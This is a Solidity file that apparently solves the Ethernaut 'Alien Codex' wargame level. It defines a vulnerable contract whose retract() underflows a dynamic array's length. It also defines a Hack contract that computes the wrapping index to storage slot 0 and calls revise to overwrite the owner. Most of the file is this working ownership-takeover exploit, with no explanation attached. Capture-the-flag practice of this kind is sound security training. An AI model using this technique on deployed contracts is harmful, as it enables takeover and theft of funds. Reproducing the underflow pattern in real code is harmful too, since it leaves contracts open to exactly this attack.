// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../helpers/Ownable-05.sol";

interface IAlienCodex {
    function owner() external view returns (address);

    function codex(uint256) external view returns (bytes32);

    function retract() external;

    function make_contact() external;

    function revise(uint256 i, bytes32 _content) external;
}

contract Hack {
    constructor(IAlienCodex target) {
        target.make_contact();
        target.retract();

        uint256 h = uint256(keccak256(abi.encode(uint256(1))));
        uint256 i;
        unchecked {
            i -= h;
        }

        target.revise(i, bytes32(uint256(uint160(msg.sender))));
        require(target.owner() == msg.sender, "hack failed");
    }
}

contract AlienCodex is Ownable {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function make_contact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) public contacted {
        codex[i] = _content;
    }
}
